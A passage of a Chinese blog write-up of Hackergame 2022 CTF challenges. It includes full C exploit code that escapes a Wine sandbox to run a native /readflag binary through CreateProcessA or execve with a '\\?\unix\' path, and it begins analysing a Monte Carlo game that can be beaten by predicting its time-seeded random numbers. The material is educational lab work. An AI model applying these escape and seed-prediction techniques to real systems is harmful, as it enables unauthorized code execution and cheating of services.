    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2333"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>有点没用的东西，懒得删了（</p>
<p>其实直接在 Windows 上编译就行</p>
<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">gcc exp1.c -o exp1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025063605068.png"></p>
<p><code>flag{Surprise_you_can_directory_traversal_1n_WINE_bb5da913e0}</code></p>
<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>如果改成读 flag2 的话会报错，没权限</p>
<pre class="line-numbers language-none"><code class="language-none">wine: Unhandled page fault on read access to 0000000000000050 at address 000000007BC52BA7 (thread 0009), starting debugger...
0009:err:seh:start_debugger Couldn't start debugger L"winedbg --auto 8 44" (2)
Read the Wine Developers Guide on how to set up winedbg or another debugger<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>按照题目意思，需要在 wine 下运行的 x86_64 架构的 Windows 命令行程序来执行 <code>/readflag</code> 程序来读取到第二个 flag</p>
<p><code>/readflag</code> 是个 ELF 文件</p>
<p>想到了 git bash，扔上去试了发现不行，缺少 dll 库，不大行</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025065733925.png"></p>
<p>发现一个有意思的事，如果传 git 目录下的 bin 下的 bash.exe 或者 sh.exe，实际上是个链接文件</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025070418026.png"></p>
<p>把 <code>server.py</code> 源码读回来</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocess
<span class="token keyword">import</span> base64

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    binary <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Base64 of binary: "</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/dev/shm/a.exe"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>binary<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># check if it is a PE binary</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/dev/shm/a.exe"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        <span class="token keyword">if</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">b"MZ"</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Not a valid PE binary."</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    output <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>
        <span class="token punctuation">[</span><span class="token string">"su"</span><span class="token punctuation">,</span> <span class="token string">"nobody"</span><span class="token punctuation">,</span> <span class="token string">"-s"</span><span class="token punctuation">,</span> <span class="token string">"/bin/bash"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span> <span class="token string">"/usr/bin/wine /dev/shm/a.exe"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>
        stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>
        env<span class="token operator">=</span><span class="token punctuation">{</span>
            <span class="token string">"WINEPREFIX"</span><span class="token punctuation">:</span> <span class="token string">"/wine"</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">)</span>
    stdout <span class="token operator">=</span> output<span class="token punctuation">.</span>stdout<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8192</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    stderr <span class="token operator">=</span> output<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"stdout (标准输出，前 8192 个字节):"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>stdout<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"stderr (标准错误，前 8192 个字节):"</span><span class="token punctuation">)</span>
    stderr <span class="token operator">=</span> stderr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>

    stderr_blacklist <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string">"it looks like wine32 is missing"</span><span class="token punctuation">,</span>
        <span class="token string">"multiarch needs to be"</span><span class="token punctuation">,</span>
        <span class="token string">"dpkg --add-architecture"</span><span class="token punctuation">,</span>
        <span class="token string">"install wine32"</span><span class="token punctuation">,</span>
        <span class="token string">"wineserver:"</span><span class="token punctuation">,</span>
        <span class="token string">r'Failed to create directory L"C:\\users\\nobody'</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span>
    limit <span class="token operator">=</span> <span class="token number">8192</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> stderr<span class="token punctuation">:</span>
        flag <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">for</span> b <span class="token keyword">in</span> stderr_blacklist<span class="token punctuation">:</span>
            <span class="token keyword">if</span> b <span class="token keyword">in</span> i<span class="token punctuation">:</span>
                flag <span class="token operator">=</span> <span class="token boolean">False</span>
                <span class="token keyword">break</span>
        <span class="token keyword">if</span> flag<span class="token punctuation">:</span>
            i_bytes <span class="token operator">=</span> i<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>i_bytes<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> limit<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
                limit <span class="token operator">-=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>i_bytes<span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                i <span class="token operator">=</span> i_bytes<span class="token punctuation">[</span><span class="token punctuation">:</span>limit<span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/19824156/how-to-run-a-bash-shell-script-via-win32-createprocess-through-wine">How to run a Bash shell script via Win32 CreateProcess through Wine?</a></p>
<p>没人回答，但他用 <code>CreateProcess</code> 成功执行了 <code>/usr/bin/touch /Users/username/Desktop/file</code></p>
<p><a target="_blank" rel="noopener" href="https://www.reddit.com/r/wine_gaming/comments/56k8bp/can_a_program_run_through_wine_launch_a_native/">Can a program run through WINE launch a native linux app? [xpost /r/Ubuntu]</a></p>
<blockquote>
<p>Yes, that’s possible, like I mentioned here: <a target="_blank" rel="noopener" href="https://www.reddit.com/r/winehq/comments/55xkrd/is_it_possible_for_a_program_running_under_wine/">https://www.reddit.com/r/winehq/comments/55xkrd/is_it_possible_for_a_program_running_under_wine/</a></p>
<p>You just need to get the path right, then it shouldn’t matter if it’s a  windows program or a linux program. Both batch and functions like  “CreateProcess” work with linux programs.</p>
<p>Yeah that’s possible: <code>Z:\bin\bash "-c "gimp \"$(winepath '%1')\"""</code></p>
<p>Just put this as “external editor”, should also work for paths with spaces.</p>
</blockquote>
<p>但是这题里 z: 的磁盘映射已被删除，就不能直接这么玩了</p>
<p>折腾了好久，又去看 wine，啥是 wine 啊</p>
<blockquote>
<p>Wine （“Wine Is Not an Emulator” 的首字母缩写）是一个能够在多种 POSIX-compliant  操作系统（诸如 Linux，macOS 及 BSD 等）上运行 Windows 应用的兼容层。Wine 不是像虚拟机或者模拟器一样模仿内部的  Windows 逻辑，而是<strong>将 Windows API 调用翻译成为动态的 POSIX  调用</strong>，免除了性能和其他一些行为的内存占用，让你能够干净地集合 Windows 应用到你的桌面。</p>
<p><a target="_blank" rel="noopener" href="https://www.winehq.org/about">https://www.winehq.org/about</a></p>
</blockquote>
<p>原来是个递归定义的名称啊。一个<strong>递归缩写</strong>（偶尔写成<strong>递归首字缩写</strong>）是一种在全称中递归引用它自己的缩写。</p>
<p>这是将 win32api 转译成 syscall 啊！</p>
<p>那能不能调用个 exec* 相关的 syscall 呢？</p>
<p>下个 <a target="_blank" rel="noopener" href="https://dl.winehq.org/wine/source/7.x/">源码</a> 回来瞄一眼吧。。（或者 <a target="_blank" rel="noopener" href="https://gitlab.winehq.org/wine/wine">https://gitlab.winehq.org/wine/wine</a> / <a target="_blank" rel="noopener" href="https://github.com/wine-mirror/wine">GitHub mirror</a></p>
<p>比如找到了个 <code>execve</code> 相关的代码在 <a target="_blank" rel="noopener" href="https://github.com/wine-mirror/wine/blob/1d178982ae5a73b18f367026c8689b56789c39fd/dlls/ntdll/unix/process.c">dlls/ntdll/unix/process.c</a></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221029012559540.png"></p>
<p>这个 <code>fork_and_exec</code> 函数在 <code>NtCreateUserProcess</code> 函数里调用，而这个就是 win32api 下 <code>CreateProcess</code> 系列函数的底层实现</p>
<p>于是其实就可以构造个 <code>CreateProcess</code> 来执行这个 <code>/readflag</code> </p>
<p>直接抄个 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/procthread/creating-processes">微软的文档 Creating Processes</a>，以及参考函数文档 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">CreateProcessA function (processthreadsapi.h)</a></p>
<p>这里这个 Command line 也就是 <code>LPSTR</code> 对应的参数，咱开始写的 <code>..\\readflag</code> 或者 <code>.\\readflag</code> 或者 <code>\\readflag</code> 之类的都不行，然后非常想不通</p>
<p>看了老半天文档，怀疑是不是不能直接用 <code>CreateProcessA</code> 而要自己调用底层的 <code>NtCreateUserProcess</code>，于是找了脚本，调了老半天，还是不行，哪里锅了呢？？？</p>
<p>赛后才知道应该是 <code>\\\\.\\unix\\readflag</code> 或者 <code>\\\\?\\unix\\readflag</code> 这样才行</p>
<p>有群友直接 wine 开个 explorer.exe 就看到根目录了，地址栏里就写了 <code>\\?unix\</code>，早知道咱也起个 wine 看了（（</p>
<p>当然源代码里有些文件和路径处理相关的文件里有判断</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221030055335379.png"></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221030055242573.png"></p>
<p>也有一些测试代码，里面也有各种例子了</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221030055124471.png"></p>
<p><strong>Exp:</strong></p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;tchar.h&gt;</span></span>

<span class="token keyword">void</span> <span class="token function">_tmain</span><span class="token punctuation">(</span> <span class="token keyword">int</span> argc<span class="token punctuation">,</span> TCHAR <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    STARTUPINFO si<span class="token punctuation">;</span>
    PROCESS_INFORMATION pi<span class="token punctuation">;</span>

    <span class="token function">ZeroMemory</span><span class="token punctuation">(</span> <span class="token operator">&amp;</span>si<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>si<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    si<span class="token punctuation">.</span>cb <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>si<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">ZeroMemory</span><span class="token punctuation">(</span> <span class="token operator">&amp;</span>pi<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pi<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// if( argc != 2 )</span>
    <span class="token comment">// {</span>
    <span class="token comment">//     printf("Usage: %s [cmdline]\n", argv[0]);</span>
    <span class="token comment">//     return;</span>
    <span class="token comment">// }</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"meow~\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Start the child process. </span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">CreateProcessA</span><span class="token punctuation">(</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>   <span class="token comment">// No module name (use command line)</span>
        <span class="token string">"\\\\.\\unix\\readflag"</span><span class="token punctuation">,</span>    <span class="token comment">//argv[1],        // Command line</span>
        <span class="token constant">NULL</span><span class="token punctuation">,</span>           <span class="token comment">// Process handle not inheritable</span>
        <span class="token constant">NULL</span><span class="token punctuation">,</span>           <span class="token comment">// Thread handle not inheritable</span>
        FALSE<span class="token punctuation">,</span>          <span class="token comment">// Set handle inheritance to FALSE</span>
        <span class="token number">0</span><span class="token punctuation">,</span>              <span class="token comment">// No creation flags</span>
        <span class="token constant">NULL</span><span class="token punctuation">,</span>           <span class="token comment">// Use parent's environment block</span>
        <span class="token constant">NULL</span><span class="token punctuation">,</span>           <span class="token comment">// Use parent's starting directory </span>
        <span class="token operator">&amp;</span>si<span class="token punctuation">,</span>            <span class="token comment">// Pointer to STARTUPINFO structure</span>
        <span class="token operator">&amp;</span>pi <span class="token punctuation">)</span>           <span class="token comment">// Pointer to PROCESS_INFORMATION structure</span>
    <span class="token punctuation">)</span> 
    <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span> <span class="token string">"CreateProcess failed (%d).\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Wait until child process exits.</span>
    <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span> pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> INFINITE <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Close process and thread handles. </span>
    <span class="token function">CloseHandle</span><span class="token punctuation">(</span> pi<span class="token punctuation">.</span>hProcess <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">CloseHandle</span><span class="token punctuation">(</span> pi<span class="token punctuation">.</span>hThread <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221029202133618.png"></p>
<p><em>说来为啥是先调用 CreateProcess 再 printf 呢（</em></p>
<p>赛后群友说直接代码里写 <code>execve</code> 就行了，草！</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"\\\\?\\unix\\readflag"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/arxive/p/11748114.html">WinExec， ShellExecute，CreateProcess 区别</a></p>
<p><a target="_blank" rel="noopener" href="https://captmeelo.com/redteam/maldev/2022/05/10/ntcreateuserprocess.html">Making NtCreateUserProcess Work</a> </p>
<p>From <code>CreateProcess()</code> to <code>NtCreateUserProcess()</code> 实现了 native APIs，PoC 在 <a target="_blank" rel="noopener" href="https://github.com/capt-meelo/NtCreateUserProcess">NtCreateUserProcess</a>，但是不懂为啥咱好像跑不起来，可能因为系统版本不同？</p>
<p>GitHub: <a target="_blank" rel="noopener" href="https://github.com/D0pam1ne705/Direct-NtCreateUserProcess">Direct-NtCreateUserProcess</a></p>
<p><a target="_blank" rel="noopener" href="https://introspelliam.github.io/2017/08/07/pwn/linux%E4%B8%8Bsystem-execve-execl-%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/">linux下system()/execve()/execl()函数使用详解</a></p>
<p>还有个有意思的 <a target="_blank" rel="noopener" href="https://schlafwandler.github.io/series/attacking-wine/">Attacking WINE 系列</a>，<a target="_blank" rel="noopener" href="https://github.com/schlafwandler/attacking_wine">GitHub repo</a></p>
</blockquote>
<h2 id="蒙特卡罗轮盘赌"><a href="#蒙特卡罗轮盘赌" class="headerlink" title="蒙特卡罗轮盘赌"></a>蒙特卡罗轮盘赌</h2><blockquote>
<p>这个估算圆周率的经典算法你一定听说过：往一个 1 x 1 大小的方格里随机撒 N 个点，统计落在以方格某个顶点为圆心、1 为半径的 1/4 扇形区域中撒落的点数为 M，那么 M / N 就将接近于 π/4 。</p>
<p>当然，这是一个概率性算法，如果想得到更精确的值，就需要撒更多的点。由于撒点是随机的，自然也无法预测某次撒点实验得到的结果到底是多少——但真的是这样吗？</p>
<p>有位好事之徒决定借此和你来一场轮盘赌：撒 40 万个点计算圆周率，而你需要猜测实验的结果精确到小数点后五位。为了防止运气太好碰巧猜中，你们约定五局三胜。</p>
<p>源代码：<a target="_blank" rel="noopener" href="https://hack.lug.ustc.edu.cn/media/c1107745-086e-53d1-b50e-35798786b4db/monte_carlo.zip">monte_carlo.zip</a>。运行环境为 <code>debian:11</code> 容器，详见源代码压缩包中的 <code>Dockerfile</code>。</p>
<p>你可以通过 <code>nc 202.38.93.111 10091</code> 来连接，或者点击下面的 “打开/下载题目” 按钮通过网页终端与远程交互。</p>
</blockquote>
<p>这傻逼题目整了喵喵三个多小时的时间，心态炸了……</p>
<p>给了源码</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;time.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>

<span class="token keyword">double</span> <span class="token function">rand01</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> RAND_MAX<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token comment">// disable buffering</span>
	<span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">clock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> games <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> win <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> lose <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> target<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> guess<span class="token punctuation">[</span><span class="token number">2000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> games<span class="token punctuation">;</span> i <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">int</span> M <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
		<span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">400000</span><span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">double</span> x <span class="token operator">=</span> <span class="token function">rand01</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">double</span> y <span class="token operator">=</span> <span class="token function">rand01</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>x<span class="token operator">*</span>x <span class="token operator">+</span> y<span class="token operator">*</span>y <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> M<span class="token operator">++</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">double</span> pi <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>M <span class="token operator">/</span> N <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">;</span>
		<span class="token function">sprintf</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token string">"%1.5f"</span><span class="token punctuation">,</span> pi<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入你的猜测（如 3.14159，输入后回车）："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">fgets</span><span class="token punctuation">(</span>guess<span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		guess<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> guess<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			win<span class="token operator">++</span><span class="token punctuation">;</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"猜对了！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
			lose<span class="token operator">++</span><span class="token punctuation">;</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"猜错了！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"正确答案是：%1.5f\n"</span><span class="token punctuation">,</span> pi<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>win <span class="token operator">&gt;=</span> <span class="token number">3</span> <span class="token operator">||</span> lose <span class="token operator">&gt;=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>win <span class="token operator">&gt;=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"胜利！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"胜败乃兵家常事，大侠请重新来过吧！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>随便查一下 C 语言函数</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://www.runoob.com/cprogramming/c-function-clock.html">C 库函数 - clock()</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wy_bk/article/details/89213965">C / C++ 中的计时函数: clock()</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/c-time-func-summary.html">C 语言中的 time 函数总结</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.runoob.com/cprogramming/c-function-time.html">C 库函数 - time()</a></p>
</li>
</ul>
<p>C 库函数 <strong>time_t time(time_t *seconds)</strong> 返回自纪元 Epoch（1970-01-01 00:00:00 UTC）起经过的时间，以秒为单位。如果 <strong>seconds</strong> 不为空，则返回值也存储在变量 <strong>seconds</strong> 中。其实也就是 UNIX 时间戳</p>
<p>clock() 函数可以返回自程序开始执行到当前位置为止, 处理器走过的时钟打点数(<em>即”ticks”, 可以理解为”处理器时间”</em>). 这个在不同的编译器，以及操作系统上还不一样，详见上面第二个链接，感觉是挺坑的一个点了。</p>
<p>这个 clock 的结果估计偏差估计有几千的数量级，相对于 time 的结果而言很大了，所以其实大概半个小时内开题目理论上都能撞出来吧。</p>
